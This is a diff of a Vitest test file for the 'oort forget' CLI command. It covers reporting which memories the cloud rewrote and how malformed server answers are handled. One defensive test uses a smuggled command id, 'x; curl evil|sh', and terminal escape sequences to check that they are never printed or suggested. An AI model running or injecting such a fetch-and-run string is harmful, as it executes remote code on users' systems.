@@ -1,4 +1,5 @@
 import * as fs from 'node:fs';
+import * as http from 'node:http';
 import * as path from 'node:path';
 import { describe, expect, it } from 'vitest';
 import { fakeCloud, fakeMemory, type FakeCloud } from '../test/helpers/fake-cloud.js';
@@ -14,7 +15,8 @@ import {
   data,
   failed,
 } from '../test/helpers.js';
-import { writeCloudSettings } from './cloud.js';
+import { createCloudClient, writeCloudSettings } from './cloud.js';
+import { readTexts } from './commands/forget.js';
 import { marked } from './commands/share.js';
 import { createKeychain } from './keychain.js';
 import { runCli } from './program.js';
@@ -37,7 +39,12 @@ function setup(mode: 'local' | 'cloud' = 'cloud') {
   // `tty` is a terminal session (stdin and stdout); `stdoutTTY: false` pipes stdout.
   const run = async (
     args: string[],
-    opts: { tty?: boolean; stdoutTTY?: boolean; answer?: string } = {},
+    opts: {
+      tty?: boolean;
+      stdoutTTY?: boolean;
+      answer?: string;
+      onIo?: (io: ReturnType<typeof fakeIo>) => void;
+    } = {},
   ) => {
     const io = fakeIo({
       cwd,
@@ -45,6 +52,7 @@ function setup(mode: 'local' | 'cloud' = 'cloud') {
       ...(opts.tty !== undefined && { tty: opts.tty, stdoutTTY: opts.stdoutTTY ?? opts.tty }),
       ...(opts.answer !== undefined && { answer: opts.answer }),
     });
+    opts.onIo?.(io);
     const code = await runCli(args, io, wire, createKeychain({ platform: 'none' }), {
       fetch: cloud.fetch,
     });
@@ -572,7 +580,9 @@ describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
       unreachable: [],
       stillShared: [{ constellation: CHECKOUT, name: 'checkout', member: true }],
       constellations: [{ constellation: CHECKOUT, name: 'checkout', member: true }],
-      // Rewriting the memories that restated it is the local store's (CON-144).
+      // What Oort Cloud's answer says about later memories (CON-161): none here.
+      rewritten: [],
+      notRewritten: [],
     });
     expect(JSON.parse(r.io.stdout).warnings).toEqual([
       {
@@ -585,9 +595,11 @@ describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
     expect(e.cloud.memories.has(ID)).toBe(false);
   });
 
-  it('forget.names-a-later-memory-that-restates-it-and-where-it-is-shared (CON-144)', async () => {
+  it('forget.an-oort-cloud-from-before-rewrites-names-a-later-memory-that-restates-it (CON-144)', async () => {
     const e = setup();
     withTeams(e);
+    // It answers 204 with no body, so the CLI walks the chain itself, after the forget.
+    e.cloud.forgetAnswer = 'pre-rewrite';
     const later = '44444444-5555-4666-8777-888888888888';
     const unrelated = '55555555-6666-4777-8888-999999999999';
     e.cloud.memories.set(
@@ -623,7 +635,7 @@ describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
     const r = await e.run(['forget', ID, '--yes', '--json']);
     expect(r.code, r.io.stderr).toBe(3);
     const d = data(r.io.stdout, 'forget');
-    // Oort Cloud does not rewrite: the local-only fields are left out, never an empty claim.
+    // That Oort Cloud does not rewrite: the fields are left out, never an empty claim.
     expect(d).not.toHaveProperty('rewritten');
     expect(d).not.toHaveProperty('notRewritten');
     expect(JSON.parse(r.io.stdout).warnings).toEqual([
@@ -636,6 +648,7 @@ describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
 
   it('forget.a-later-memory-it-could-not-read-is-a-warning-and-exit-3 (CON-144)', async () => {
     const e = setup();
+    e.cloud.forgetAnswer = 'pre-rewrite';
     const later = '44444444-5555-4666-8777-888888888888';
     e.cloud.memories.set(
       ID,
@@ -733,6 +746,8 @@ describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
       unreachable: [DESIGN],
       stillShared: [checkout, design],
       constellations: [core, checkout, design],
+      rewritten: [],
+      notRewritten: [],
     });
     expect((JSON.parse(r.io.stdout).warnings as { code: string }[]).map((w) => w.code)).toEqual([
       'removal-requested',
@@ -875,5 +890,482 @@ describe('oort forget and shared copies (Oort Cloud, CON-67)', () => {
     expect(yes.io.asked[0]).toContain('withdraw your copies from oort-core');
     expect(changes()).toEqual([`DELETE /v1/memories/${ID}`]);
     expect(e.cloud.hive.shared.size).toBe(0);
+  });
+});
+
+describe('oort forget reports what Oort Cloud rewrote (CON-161)', () => {
+  const LATER = '44444444-5555-4666-8777-888888888888';
+  const NEXT = '55555555-6666-4777-8888-999999999999';
+
+  /** ID, then LATER (already rewritten by the cloud: the fake rewrites nothing), then NEXT. */
+  function chain(e: ReturnType<typeof setup>): void {
+    e.cloud.memories.set(
+      ID,
+      fakeMemory({ id: ID, text: 'The dev server runs on port 3000.', supersededBy: LATER }),
+    );
+    e.cloud.memories.set(
+      LATER,
+      fakeMemory({
+        id: LATER,
+        text: 'The dev server port is 8080.',
+        supersedes: ID,
+        supersededBy: NEXT,
+      }),
+    );
+    e.cloud.memories.set(
+      NEXT,
+      fakeMemory({ id: NEXT, text: 'The dev server port changed from 3000 to 8081.' }),
+    );
+  }
+
+  it('forget.cloud-names-what-it-rewrote-as-local-mode-does-and-exits-0', async () => {
+    const e = setup();
+    chain(e);
+    e.cloud.forgetAnswer = { rewritten: [LATER] };
+    const r = await e.run(['forget', ID, '--yes']);
+    expect(r.code, r.io.stderr).toBe(0);
+    expect(r.io.stdout).toBe(
+      `Forgot ${ID}.\nRewrote 44444444 to its current fact: "The dev server port is 8080."\n`,
+    );
+    // The cloud's answer is the report: no walk of the chain, only the rewritten text read after.
+    // NEXT restates 3000, but the cloud did not name it: the CLI never adds one of its own.
+    expect(e.cloud.seen.slice(e.cloud.seen.indexOf(`DELETE /v1/memories/${ID}`))).toEqual([
+      `DELETE /v1/memories/${ID}`,
+      `GET /v1/memories/${LATER}`,
+    ]);
+    expect(e.cloud.seen).not.toContain(`GET /v1/memories/${NEXT}`);
+  });
+
+  it('forget.cloud-names-each-memory-left-as-it-was-with-its-reason-and-exits-3', async () => {
+    const e = setup();
+    chain(e);
+    const ids = ['a', 'b', 'd', 'e', 'c', 'f', '9'].map(
+      (x) => `${x.repeat(8)}-0000-4000-8000-000000000000`,
+    );
+    const [q, u, t, w, c, n, m] = ids as [string, string, string, string, string, string, string];
+    e.cloud.forgetAnswer = {
+      rewritten: [LATER],
+      notRewritten: ids,
+      reasons: {
+        [q]: 'quota',
+        [u]: 'unpaid',
+        [t]: 'timeout',
+        [w]: 'no-writer',
+        [c]: 'chain-too-long',
+        // A reason from a newer Oort Cloud, with an escape sequence: shown, never run.
+        [n]: 'brand-new\u001b[31m',
+        // m: none given.
+      },
+    };
+    const r = await e.run(['forget', ID, '--yes', '--json']);
+    expect(r.code, r.io.stderr).toBe(3);
+    const d = data(r.io.stdout, 'forget');
+    expect(d.rewritten).toEqual([LATER]);
+    expect(d.notRewritten).toEqual(ids);
+    const tail = (id: string) =>
+      ` Check it with \`oort inspect ${id}\`, or forget it too: \`oort forget ${id}\`.`;
+    expect(JSON.parse(r.io.stdout).warnings).toEqual([
+      {
+        code: 'not-rewritten',
+        message: `aaaaaaaa may still restate it, because the account is at a usage cap.${tail(q)}`,
+      },
+      {
+        code: 'not-rewritten',
+        message: `bbbbbbbb may still restate it, because the plan does not allow model calls now.${tail(u)}`,
+      },
+      {
+        code: 'not-rewritten',
+        message: `dddddddd may still restate it, because the rewrite did not finish in time.${tail(t)}`,
+      },
+      {
+        code: 'not-rewritten',
+        message: `eeeeeeee may still restate it, because no memory writer is set up (oort doctor says why).${tail(w)}`,
+      },
+      {
+        code: 'not-rewritten',
+        message: `cccccccc is a later memory of its chain and may restate it, because it lies past the first 64 later memories of the chain, the most one forget rewrites.${tail(c)}`,
+      },
+      {
+        code: 'not-rewritten',
+        message: `ffffffff may still restate it, because Oort Cloud left it as it was (reason: brand-new\\u{1b}[31m).${tail(n)}`,
+      },
+      {
+        code: 'not-rewritten',
+        message: `99999999 may still restate it, because Oort Cloud left it as it was.${tail(m)}`,
+      },
+    ]);
+    expect(r.io.stderr).toContain(
+      'Rewrote 44444444 to its current fact: "The dev server port is 8080."',
+    );
+    expect(r.io.stderr).not.toContain('\u001b');
+  });
+
+  it('forget.cloud-odd-answers-never-crash-and-never-claim-a-rewrite', async () => {
+    const e = setup();
+    chain(e);
+    // An id in both lists is not claimed as rewritten; a non-string id is dropped; reasons that
+    // are not an object give no reason.
+    e.cloud.forgetAnswer = {
+      rewritten: [LATER, 42, null, {}, [1]],
+      notRewritten: [LATER, {}, [1], {}],
+      reasons: [],
+    };
+    const r = await e.run(['forget', ID, '--yes', '--json']);
+    expect(r.code, r.io.stderr).toBe(3);
+    // Each odd entry counts, a repeated one too (as the Python SDK counts them).
+    expect(data(r.io.stdout, 'forget')).toMatchObject({
+      rewritten: [],
+      notRewritten: [LATER],
+      notRewrittenUnnamed: 3,
+    });
+    expect(r.io.stderr).not.toContain('Rewrote');
+    // A body that is not JSON reads as no lists: the CLI walks the chain itself.
+    const g = setup();
+    chain(g);
+    g.cloud.fail = { 'DELETE /v1/memories/:id': 'garbage' };
+    const garbage = await g.run(['forget', ID, '--yes', '--json']);
+    expect(garbage.code, garbage.io.stderr).toBe(3);
+    expect(data(garbage.io.stdout, 'forget')).not.toHaveProperty('rewritten');
+  });
+
+  it('forget.cloud-rewritten-text-that-cannot-be-read-still-names-the-rewrite', async () => {
+    const e = setup();
+    chain(e);
+    e.cloud.forgetAnswer = { rewritten: [LATER] };
+    e.cloud.fail = { [`GET /v1/memories/${LATER}`]: 503 };
+    const r = await e.run(['forget', ID, '--yes']);
+    expect(r.code, r.io.stderr).toBe(0);
+    expect(r.io.stdout).toBe(
+      `Forgot ${ID}.\nRewrote 44444444 to its current fact. Read it with \`oort inspect ${LATER}\`.\n`,
+    );
+  });
+
+  it('forget.cloud-answer-without-the-lists-is-an-oort-cloud-from-before-rewrites', async () => {
+    for (const body of [{ forgotten: ID }, { rewritten: 'no', notRewritten: null }]) {
+      const e = setup();
+      chain(e);
+      e.cloud.forgetAnswer = {
+        rewritten: undefined,
+        notRewritten: undefined,
+        reasons: undefined,
+        ...body,
+      };
+      const r = await e.run(['forget', ID, '--yes', '--json']);
+      // The CLI walks the chain itself, as before: NEXT restates 3000.
+      expect(r.code, r.io.stderr).toBe(3);
+      const d = data(r.io.stdout, 'forget');
+      expect(d).not.toHaveProperty('rewritten');
+      expect(d).not.toHaveProperty('notRewritten');
+      expect(
+        (JSON.parse(r.io.stdout).warnings as { message: string }[]).map((x) => x.message),
+      ).toEqual([
+        `55555555 may still restate it: Oort Cloud does not rewrite later memories yet. Check it with \`oort inspect ${NEXT}\`, or forget it too: \`oort forget ${NEXT}\`.`,
+      ]);
+    }
+  });
+
+  it('forget.everywhere-reports-what-oort-cloud-rewrote', async () => {
+    const e = setup();
+    withTeams(e);
+    chain(e);
+    copyIn(e, CHECKOUT);
+    e.cloud.forgetAnswer = {
+      rewritten: [LATER],
+      notRewritten: [NEXT],
+      reasons: { [NEXT]: 'unpaid' },
+    };
+    const r = await e.run(['forget', ID, '--everywhere', '--yes']);
+    expect(r.code, r.io.stderr).toBe(3);
+    expect(r.io.stdout).toBe(
+      [
+        `Forgot ${ID}.`,
+        'Withdrawn from checkout.',
+        `55555555 may still restate it, because the plan does not allow model calls now. Check it with \`oort inspect ${NEXT}\`, or forget it too: \`oort forget ${NEXT} --everywhere\`.`,
+        'Rewrote 44444444 to its current fact: "The dev server port is 8080."',
+        '',
+      ].join('\n'),
+    );
+    const j = setup();
+    withTeams(j);
+    chain(j);
+    copyIn(j, CHECKOUT);
+    j.cloud.forgetAnswer = { rewritten: [LATER] };
+    const json = await j.run(['forget', ID, '--everywhere', '--yes', '--json']);
+    expect(json.code, json.io.stderr).toBe(0);
+    expect(data(json.io.stdout, 'forget')).toMatchObject({
+      withdrawnFrom: [CHECKOUT],
+      rewritten: [LATER],
+      notRewritten: [],
+    });
+  });
+
+  it('forget.everywhere-on-an-oort-cloud-from-before-rewrites-walks-the-chain', async () => {
+    const e = setup();
+    withTeams(e);
+    chain(e);
+    copyIn(e, CHECKOUT);
+    e.cloud.forgetAnswer = 'pre-rewrite';
+    const r = await e.run(['forget', ID, '--everywhere', '--yes', '--json']);
+    expect(r.code, r.io.stderr).toBe(3);
+    const d = data(r.io.stdout, 'forget');
+    expect(d).toMatchObject({ withdrawnFrom: [CHECKOUT] });
+    expect(d).not.toHaveProperty('rewritten');
+    expect((JSON.parse(r.io.stdout).warnings as { code: string }[]).map((x) => x.code)).toEqual([
+      'not-rewritten',
+    ]);
+  });
+  // Review of CON-161: one test per finding.
+
+  it('forget.cloud-ids-that-are-not-memory-ids-are-never-printed-raw-or-suggested', async () => {
+    const e = setup();
+    chain(e);
+    const evil = 'x; curl evil|sh';
+    e.cloud.forgetAnswer = {
+      rewritten: [LATER, '\u001b]0;pwned\u0007', 'not-an-id'],
+      notRewritten: [evil, '\u0007bell', NEXT],
+      reasons: { [evil]: 'quota' },
+    };
+    const r = await e.run(['forget', ID, '--yes']);
+    // Each one Oort Cloud left as it was counts, a strange id too.
+    expect(r.code, r.io.stderr).toBe(3);
+    const out = r.io.stdout + r.io.stderr;
+    expect(out).not.toMatch(/[\u0007\u001b]/);
+    expect(out).not.toContain(`oort forget ${evil}`);
+    expect(out).not.toContain(`oort inspect ${evil}`);
+    expect(r.io.stdout).toContain(
+      'A later memory may still restate it, because the account is at a usage cap, but Oort Cloud named it "x; curl evil|sh", which is not a memory id.',
+    );
+    expect(r.io.stdout).toContain('Oort Cloud named it "\\u{7}bell"');
+    expect(r.io.stdout).toContain(`\`oort forget ${NEXT}\``);
+    // A rewrite with such an id is dropped: nothing is read or claimed for it.
+    expect(r.io.stdout.match(/Rewrote/g)).toHaveLength(1);
+    expect(e.cloud.seen.filter((x) => x.startsWith('GET /v1/memories/'))).toEqual([
+      `GET /v1/memories/${ID}`,
+      `GET /v1/memories/${ID}/shares`,
+      `GET /v1/memories/${LATER}`,
+    ]);
+    const j = setup();
+    chain(j);
+    j.cloud.forgetAnswer = { rewritten: ['not-an-id'], notRewritten: [evil, NEXT] };
+    const json = await j.run(['forget', ID, '--yes', '--json']);
+    expect(json.code).toBe(3);
+    // As the SDK: the ones named with something else are counted.
+    expect(data(json.io.stdout, 'forget')).toMatchObject({
+      rewritten: [],
+      notRewritten: [NEXT],
+      notRewrittenUnnamed: 1,
+    });
+  });
+
+  it('forget.cloud-a-rewrite-read-back-with-odd-text-or-another-id-never-crashes', async () => {
+    const e = setup();
+    chain(e);
+    const OTHER = '66666666-7777-4888-8999-aaaaaaaaaaaa';
+    e.cloud.memories.set(LATER, { ...fakeMemory({ id: LATER }), text: 42 as unknown as string });
+    // A read that resolves to another memory (as a prefix can) is not its text either.
+    const swapped = LATER.replace('4', '7');
+    e.cloud.memories.set(swapped, fakeMemory({ id: OTHER, text: 'Not it.' }));
+    e.cloud.forgetAnswer = { rewritten: [LATER, swapped], notRewritten: [NEXT] };
+    const r = await e.run(['forget', ID, '--yes']);
+    expect(r.code, r.io.stderr).toBe(3);
+    expect(r.io.stdout).toContain(
+      `Rewrote 44444444 to its current fact. Read it with \`oort inspect ${LATER}\`.`,
+    );
+    expect(r.io.stdout).toContain(
+      `Rewrote 74444444 to its current fact. Read it with \`oort inspect ${swapped}\`.`,
+    );
+    expect(r.io.stdout).not.toContain('Not it.');
+    expect(r.io.stdout).toContain('55555555 may still restate it');
+  });
+
+  it('forget.cloud-reads-at-most-64-rewrites-4-at-a-time-after-naming-what-was-left', async () => {
+    const e = setup();
+    chain(e);
+    const many = Array.from(
+      { length: 70 },
+      (_, i) => `${i.toString(16).padStart(8, '0')}-0000-4000-8000-000000000000`,
+    );
+    for (const id of many) e.cloud.memories.set(id, fakeMemory({ id, text: `Fact ${id}.` }));
+    e.cloud.forgetAnswer = { rewritten: many, notRewritten: [NEXT] };
+    let inFlight = 0;
+    let most = 0;
+    let stdoutAtFirstRead: string | undefined;
+    let io: { stdout: string } | undefined;
+    e.cloud.getGate = async (id) => {
+      if (!many.includes(id)) return;
+      stdoutAtFirstRead ??= io?.stdout;
+      inFlight += 1;
+      most = Math.max(most, inFlight);
+      await new Promise((r) => setTimeout(r, 2));
+      inFlight -= 1;
+    };
+    const r = await e.run(['forget', ID, '--yes'], { onIo: (x) => (io = x) });
+    expect(r.code, r.io.stderr).toBe(3);
+    // "Forgot" and what was left as it was come first, before any read can stall.
+    expect(stdoutAtFirstRead).toBe(
+      `Forgot ${ID}.\n55555555 may still restate it, because Oort Cloud left it as it was. Check it with \`oort inspect ${NEXT}\`, or forget it too: \`oort forget ${NEXT}\`.\n`,
+    );
+    expect(
+      e.cloud.seen.filter((x) => many.some((id) => x === `GET /v1/memories/${id}`)),
+    ).toHaveLength(64);
+    expect(most).toBeLessThanOrEqual(4);
+    expect(r.io.stdout.match(/Rewrote /g)).toHaveLength(70);
+    expect(r.io.stdout).toContain(
+      `Rewrote 00000045 to its current fact. Read it with \`oort inspect ${many[69]}\`.`,
+    );
+  });
+
+  /** A read that answers only when it is aborted, and then settles `settleMs` later. */
+  const untilAborted =
+    (settleMs = 0) =>
+    (_id: string, signal: AbortSignal): Promise<never> =>
+      new Promise<never>((_, reject) =>
+        signal.addEventListener('abort', () =>
+          setTimeout(() => reject(new Error('aborted')), settleMs),
+        ),
+      );
+
+  it('forget.cloud-a-read-that-never-answers-gives-up-after-its-timeout', async () => {
+    const stuck = untilAborted();
+    const texts = await readTexts(
+      ['a', 'b', 'c'],
+      async (id, signal) => (id === 'b' ? stuck(id, signal) : { id, text: `T${id}` }),
+      { timeoutMs: 20 },
+    );
+    expect(texts).toEqual([{ id: 'a', text: 'Ta' }, { id: 'b' }, { id: 'c', text: 'Tc' }]);
+  });
+
+  it('forget.cloud-reads-back-at-most-4-at-once-even-while-abandoned-ones-wind-down', async () => {
+    let inFlight = 0;
+    let most = 0;
+    const slow = untilAborted(15);
+    const texts = await readTexts(
+      Array.from({ length: 12 }, (_, i) => `id${i}`),
+      async (id, signal) => {
+        inFlight += 1;
+        most = Math.max(most, inFlight);
+        try {
+          return await slow(id, signal);
+        } finally {
+          inFlight -= 1;
+        }
+      },
+      { timeoutMs: 5 },
+    );
+    expect(texts.every((t) => t.text === undefined)).toBe(true);
+    expect(most).toBe(4);
+    expect(inFlight).toBe(0);
+  });
+
+  it('forget.cloud-read-back-stops-at-its-overall-deadline', async () => {
+    const t0 = Date.now();
+    const texts = await readTexts(
+      ['a', 'b', 'c', 'd', 'e', 'f'],
+      async (id, signal) => (id === 'a' ? { id, text: 'Ta' } : untilAborted()(id, signal)),
+      { timeoutMs: 60_000, deadlineMs: 40, parallel: 1 },
+    );
+    expect(Date.now() - t0).toBeLessThan(2_000);
+    expect(texts).toEqual([
+      { id: 'a', text: 'Ta' },
+      { id: 'b' },
+      { id: 'c' },
+      { id: 'd' },
+      { id: 'e' },
+      { id: 'f' },
+    ]);
+  });
+
+  it(
+    'forget.cloud-an-abandoned-read-of-a-stalled-body-leaves-no-socket-open',
+    { timeout: 15_000 },
+    async () => {
+      const open = new Set<import('node:net').Socket>();
+      /** The connections that carried a read: aborting the read closes each one. */
+      const reading = new Set<import('node:net').Socket>();
+      let requests = 0;
+      let most = 0;
+      const server = http.createServer((req, res) => {
+        requests += 1;
+        most = Math.max(most, requests);
+        reading.add(req.socket);
+        req.socket.once('close', () => {
+          requests -= 1;
+          reading.delete(req.socket);
+        });
+        // Headers and part of the body, then nothing.
+        res.writeHead(200, { 'content-type': 'application/json' });
+        res.write('{"id":"');
+      });
+      server.on('connection', (s) => {
+        open.add(s);
+        s.once('close', () => open.delete(s));
+      });
+      await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
+      try {
+        const { port } = server.address() as import('node:net').AddressInfo;
+        const client = createCloudClient({ url: `http://127.0.0.1:${port}`, key: 'k' });
+        const ids = Array.from(
+          { length: 6 },
+          (_, i) => `${i.toString(16).padStart(8, '0')}-0000-4000-8000-000000000000`,
+        );
+        const texts = await readTexts(
+          ids,
+          (id, signal) => client.get(id, { timeoutMs: 100, signal }),
+          { timeoutMs: 100 },
+        );
+        expect(texts).toEqual(ids.map((id) => ({ id })));
+        expect(most).toBeLessThanOrEqual(4);
+        const until = async (done: () => boolean, ms: number): Promise<void> => {
+          for (const end = Date.now() + ms; !done() && Date.now() < end;) {
+            await new Promise((r) => setTimeout(r, 10));
+          }
+        };
+        // Every read was aborted, its connection with it, at once.
+        await until(() => reading.size === 0, 500);
+        expect(reading.size).toBe(0);
+        // Node 24's fetch may also open spare connections that never carry a request; it keeps them
+        // idle (not holding the process) and closes them after its keep-alive timeout, about 3 s.
+        await until(() => open.size === 0, 8_000);
+        expect(open.size).toBe(0);
+      } finally {
+        server.closeAllConnections();
+        await new Promise((r) => server.close(r));
+      }
+    },
+  );
+
+  it('forget.cloud-dot-ids-never-reach-another-route', async () => {
+    const e = setup();
+    chain(e);
+    e.cloud.forgetAnswer = { rewritten: ['..', '.'], notRewritten: ['.'] };
+    const r = await e.run(['forget', ID, '--yes']);
+    expect(r.code, r.io.stderr).toBe(3);
+    expect(e.cloud.seen.filter((x) => x.startsWith('GET'))).toEqual([
+      `GET /v1/memories/${ID}`,
+      `GET /v1/memories/${ID}/shares`,
+    ]);
+    expect(r.io.stdout).toContain('Oort Cloud named it ".", which is not a memory id.');
+    expect(r.io.stdout).not.toContain('Rewrote');
+  });
+
+  it('forget.cloud-suggests-everywhere-for-a-later-memory-when-the-forgotten-one-was-shared', async () => {
+    const e = setup();
+    withTeams(e);
+    chain(e);
+    copyIn(e, CHECKOUT);
+    e.cloud.forgetAnswer = { notRewritten: [NEXT] };
+    const r = await e.run(['forget', ID, '--yes']);
+    expect(r.code, r.io.stderr).toBe(3);
+    expect(r.io.stdout).toContain(`forget it too: \`oort forget ${NEXT} --everywhere\`.`);
+    // No extra lookups: the forgotten memory's own shares say so.
+    expect(e.cloud.seen.filter((x) => x.endsWith('/shares'))).toEqual([
+      `GET /v1/memories/${ID}/shares`,
+    ]);
+    // Not shared: the plain command.
+    const p = setup();
+    chain(p);
+    p.cloud.forgetAnswer = { notRewritten: [NEXT] };
+    const plain = await p.run(['forget', ID, '--yes']);
+    expect(plain.io.stdout).toContain(`forget it too: \`oort forget ${NEXT}\`.`);
   });
 });
